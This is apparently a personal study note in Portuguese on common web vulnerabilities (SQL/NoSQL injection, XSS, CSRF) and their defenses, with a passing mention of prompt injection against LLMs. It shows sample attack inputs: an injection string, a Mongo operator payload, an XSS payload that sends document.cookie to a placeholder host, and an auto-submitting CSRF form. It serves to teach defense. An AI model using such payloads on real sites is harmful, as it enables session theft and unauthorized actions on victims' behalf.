O padrão que se repete em quase toda vulnerabilidade de aplicação web: **dado do usuário sendo interpretado como código**. Muda só o interpretador.

### Injection

O clássico é SQL:

```javascript
db.query(`SELECT * FROM usuarios WHERE email = '${email}'`);
```

Com `email = "' OR '1'='1"` a query vira outra coisa. A correção não é escapar na mão, é **nunca concatenar**:

```javascript
db.query("SELECT * FROM usuarios WHERE email = $1", [email]);
```

Query parametrizada manda estrutura e dado por canais separados. O banco nunca reinterpreta o valor como SQL.

No Mongo o formato muda mas a ideia é a mesma:

```javascript
// se req.body.senha vier como { $ne: null }, isso vira "senha diferente de null"
db.usuarios.findOne({ email: req.body.email, senha: req.body.senha });
```

NoSQL injection. Por isso validar o **tipo** com schema antes de chegar na query resolve ([[Tipando a borda da aplicação]]).

E existe injection em qualquer interpretador: comando de shell, LDAP, template engine, e agora prompt de LLM ([[2 - Como um prompt é montado]]) — que é a mesma família de problema sem uma solução tão boa quanto query parametrizada.

### XSS

Dado do usuário virando HTML/JS na página de outra pessoa.

```jsx
<div dangerouslySetInnerHTML={{ __html: comentario }} />
```

Se o comentário for `<img src=x onerror="fetch('https://mal.com?c='+document.cookie)">`, o script roda no navegador de quem visualizar.

React escapa por padrão — `{comentario}` vira texto. Por isso o nome do prop é assustador de propósito.

Tipos:
- **stored** — salvo no banco, atinge todo mundo. O pior
- **reflected** — volta na resposta a partir da URL
- **DOM-based** — só no cliente, via `innerHTML`, `eval`, `location.hash`

Defesas:
- escapar na **saída**, no contexto certo (HTML, atributo, URL e JS têm regras diferentes)
- sanitizar HTML rico com DOMPurify, nunca com regex própria
- **CSP** como segunda linha:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Bloqueia script inline e de domínio estranho. Não impede a falha, impede o estrago.
- cookie `HttpOnly` — o XSS não consegue ler a sessão ([[4 - Cookies e sessions]])

### CSRF

O navegador manda cookie automaticamente. Então um site malicioso pode fazer o navegador da vítima disparar uma requisição autenticada:

```html
<form action="https://banco.com/transferir" method="POST">
  <input name="valor" value="1000">
  <input name="para" value="atacante">
</form>
<script>document.forms[0].submit()</script>
```

O atacante **não lê** a resposta (a same-origin policy impede — ver [[8 - CORS]]), mas a transferência aconteceu. O efeito colateral já é o ataque.

Defesas:
- `SameSite=Lax` no cookie de sessão. Resolve a maioria dos casos e hoje é o padrão do navegador
- **token CSRF** — valor imprevisível no formulário, conferido no servidor. O atacante não consegue ler o token (isso a same-origin bloqueia)
- não usar GET pra ação que muda estado ([[1 - Anatomia de uma requisição HTTP]])

Detalhe: API que autentica por header `Authorization` **não** sofre CSRF, porque header não é enviado automaticamente. O problema é exclusivo de credencial automática (cookie, basic auth).

### Outras coisas do básico

**Rate limiting** — login, recuperação de senha e qualquer rota cara. Sem isso, força bruta é só questão de tempo.

**Headers de segurança** (`helmet` já põe tudo):

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

**Nunca logar** senha, token, cartão. Log vaza pra ferramenta de observabilidade, backup, prints em chamada.

**Dependência** — a maior parte do meu código é `node_modules`. `npm audit`, Dependabot, e olhar o que estou instalando. Typosquatting é real ([[3 - package.json e npm]]).

**Upload** — validar tipo pelo conteúdo (magic bytes), não pela extensão nem pelo `Content-Type` que o cliente mandou. Limitar tamanho. Servir de outro domínio, pra que um HTML malicioso enviado não rode na minha origem.

**Mensagem de erro genérica** pro cliente, detalhe no log ([[9 - Tratamento de erros]]). Stack trace em produção entrega estrutura de pastas, versão de framework e às vezes credencial.

### O princípio que resume

**Nunca confie na entrada, sempre escape a saída.** Validar na entrada garante formato; escapar na saída garante que o dado não seja executado no destino. Precisa dos dois — validação sozinha não sabe pra qual contexto o dado vai.

E: **o cliente não é confiável**. Validação no front é UX. A checagem que vale é a do servidor.
